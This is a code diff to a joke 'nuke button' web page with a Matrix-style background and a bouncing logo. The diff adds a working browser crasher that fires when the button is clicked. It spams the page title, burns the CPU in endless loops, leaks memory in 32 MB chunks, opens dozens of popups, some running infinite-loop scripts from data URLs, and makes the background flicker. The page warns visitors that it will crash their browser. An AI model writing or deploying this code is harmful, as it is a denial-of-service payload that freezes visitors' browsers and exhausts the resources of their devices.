@@ -21,9 +21,6 @@
         }
         #logo-container {
             position: absolute;
-            left: 50%;
-            top: 50%;
-            transform: translate(-50%, -50%);
             pointer-events: none;
             z-index: 10;
             text-align: center;
@@ -33,7 +30,7 @@
             pointer-events: auto;
             cursor: pointer;
             image-rendering: pixelated;
-            width:  min(260px, 55vw);
+            width: min(260px, 55vw);
             max-width: 260px;
         }
         #nuke-button {
@@ -73,7 +70,7 @@
             transition: opacity 0.4s;
         }
         #crash-gif {
-            width:  min(80vmin, 640px);
+            width: min(80vmin, 640px);
             height: auto;
             margin-bottom: 24px;
             border: 6px solid #fff;
@@ -107,7 +104,7 @@
 
     <div id="crash-overlay">
         <img id="crash-gif" src="https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif" alt="BOOM">
-        <div id="status">PREPARING DESTRUCTION SEQUENCE...</div>
+        <div id="status">SYSTEM DESTRUCTION INITIATED!</div>
         <div class="warning">WARNING: THIS WILL CRASH YOUR BROWSER</div>
     </div>
 
@@ -128,7 +125,6 @@
         function drawMatrix() {
             ctx.fillStyle = 'rgba(0,0,0,0.06)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
-
             ctx.fillStyle = '#0f0';
             ctx.font = '16px monospace';
 
@@ -140,9 +136,7 @@
                 const y = drops[i] * 16;
                 ctx.fillText(txt, x, y);
 
-                if (y > canvas.height && Math.random() > 0.975) {
-                    drops[i] = 0;
-                }
+                if (y > canvas.height && Math.random() > 0.975) drops[i] = 0;
                 drops[i]++;
             }
         }
@@ -153,13 +147,13 @@
 
         // ─── Bouncing Logo ──────────────────────────────────────
         const logoContainer = document.getElementById('logo-container');
-        let logoX = window.innerWidth * 0.5 - 130;
-        let logoY = window.innerHeight * 0.5 - 70;
+        let logoX = Math.random() * (window.innerWidth - 260);
+        let logoY = Math.random() * (window.innerHeight - 140);
         let vx = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.2);
         let vy = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.2);
 
         function animateLogo() {
-            const w = logoContainer.offsetWidth  || 260;
+            const w = logoContainer.offsetWidth || 260;
             const h = logoContainer.offsetHeight || 140;
 
             logoX += vx;
@@ -194,59 +188,73 @@
             nukeBtn.disabled = true;
             nukeBtn.style.display = 'none';
             overlay.style.opacity = '1';
+            status.textContent = "SYSTEM DESTRUCTION INITIATED!";
 
-            let dots = 0;
-            const dotInterval = setInterval(() => {
-                dots = (dots + 1) % 4;
-                status.textContent = "PREPARING SYSTEM DESTRUCTION" + ".".repeat(dots);
-            }, 400);
+            // ─── Brash-style title spam ───
+            let counter = 0;
+            function titleSpam() {
+                document.title = Math.random().toString(36).repeat(12) + " ☠ " + counter;
+                counter++;
+                if (counter < 80000) requestAnimationFrame(titleSpam);
+            }
+            titleSpam();
 
-            setTimeout(() => {
-                clearInterval(dotInterval);
-                status.textContent = "EXECUTING DESTRUCTION...";
-
-                // ─── Brash-style title spam (most effective part) ───
-                let counter = 0;
-                function titleSpam() {
-                    document.title = Math.random().toString(36).repeat(12) + " ☠ " + counter;
-                    counter++;
-                    if (counter < 80000) requestAnimationFrame(titleSpam);
+            // ─── CPU burn ───
+            function cpuBurn() {
+                let x = 0;
+                for (let i = 0; i < 4e7; i++) {
+                    x += Math.sin(Date.now() * Math.random());
                 }
-                titleSpam();
+                setTimeout(cpuBurn, 0);
+            }
+            setTimeout(cpuBurn, 100);
 
-                // Heavy math in main thread
-                function cpuBurn() {
-                    let x = 0;
-                    for (let i = 0; i < 4e7; i++) {
-                        x += Math.sin(Date.now() * Math.random());
-                    }
-                    if (counter < 60000) setTimeout(cpuBurn, 0);
-                }
-                setTimeout(cpuBurn, 400);
+            // ─── Memory leak ───
+            const leak = [];
+            function memoryLeak() {
+                // Push large arrays repeatedly
+                leak.push(new Array(1000000).fill(Math.random().toString(36)));
+                // Try to force garbage collection delay
+                leak.push(new Uint8Array(32 * 1024 * 1024)); // ~32MB chunks
+                setTimeout(memoryLeak, 50);
+            }
+            memoryLeak();
 
-                // Memory pressure (modern browsers limit this quite a bit)
-                const leak = [];
-                function eatMemory() {
+            // ─── Open popups (not tabs) ───
+            function openPopups() {
+                const width = 400;
+                const height = 300;
+                const left = Math.floor(Math.random() * (window.screen.width - width));
+                const top = Math.floor(Math.random() * (window.screen.height - height));
+                const options = `width=${width},height=${height},left=${left},top=${top}`;
+
+                for (let i = 0; i < 20; i++) {
                     try {
-                        leak.push(new Uint8Array(32 * 1024 * 1024)); // ~32 MB chunks
-                    } catch {}
-                    setTimeout(eatMemory, 80);
+                        window.open(
+                            'about:blank',
+                            '_blank',
+                            options
+                        );
+                    } catch (e) {}
                 }
-                setTimeout(eatMemory, 800);
 
-                // Try opening tabs (will be popup-blocked in most cases)
-                setTimeout(() => {
-                    for (let i = 0; i < 15; i++) {
-                        window.open('about:blank', '_blank');
-                    }
-                }, 1200);
+                // Some with self-replicating content
+                for (let i = 0; i < 10; i++) {
+                    try {
+                        window.open(
+                            'data:text/html,<script>while(true){}</script>',
+                            '_blank',
+                            options
+                        );
+                    } catch (e) {}
+                }
+            }
+            openPopups();
 
-                // Random background flicker
-                setInterval(() => {
-                    document.body.style.background = `hsl(${Math.random()*360}, 80%, 20%)`;
-                }, 180);
-
-            }, 2800);
+            // Random background flicker
+            setInterval(() => {
+                document.body.style.background = `hsl(${Math.random()*360}, 80%, 20%)`;
+            }, 180);
         });
     </script>
 </body>
